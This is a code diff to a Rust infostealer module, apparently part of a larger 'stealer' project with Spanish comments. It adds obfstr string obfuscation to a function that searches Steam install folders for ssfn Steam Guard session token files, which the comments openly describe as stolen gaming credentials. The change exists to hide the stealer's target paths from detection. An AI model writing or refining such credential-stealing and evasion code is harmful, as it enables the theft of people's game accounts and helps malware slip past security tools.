@@ -2,6 +2,7 @@
 use crate::stealer::common::{get_appdata_local, get_appdata_roaming};
 use std::path::PathBuf;
 use std::fs;
+use obfstr::obfstr; // ← Ofuscación de strings
 
 /// Credenciales de gaming robadas
 #[derive(Debug, Clone)]
@@ -51,10 +52,10 @@ fn steal_steam_data() -> Vec<GamingData> {
     // - C:\Program Files (x86)\Steam (installdir)
     // - %LOCALAPPDATA%\Steam (algunos configs)
     
-    // Buscar instalación de Steam
+    // Buscar instalación de Steam - OFUSCADO
     let steam_paths = vec![
-        PathBuf::from(r"C:\Program Files (x86)\Steam"),
-        PathBuf::from(r"C:\Program Files\Steam"),
+        PathBuf::from(obfstr!(r"C:\Program Files (x86)\Steam")),
+        PathBuf::from(obfstr!(r"C:\Program Files\Steam")),
     ];
     
     for steam_path in steam_paths {
@@ -62,8 +63,8 @@ fn steal_steam_data() -> Vec<GamingData> {
             continue;
         }
         
-        // 1. Session files (ssfn files - Steam Guard)
-        let config_path = steam_path.join("config");
+        // 1. Session files (ssfn files - Steam Guard) - OFUSCADO
+        let config_path = steam_path.join(obfstr!("config"));
         if config_path.exists() {
             let mut session_files = Vec::new();
             
@@ -72,7 +73,7 @@ fn steal_steam_data() -> Vec<GamingData> {
                     let file_name = entry.file_name().to_string_lossy().to_string();
                     
                     // ssfn* files contienen tokens de Steam Guard
-                    if file_name.starts_with("ssfn") {
+                    if file_name.starts_with(obfstr!("ssfn")) {
                         session_files.push(file_name);
                     }
                 }
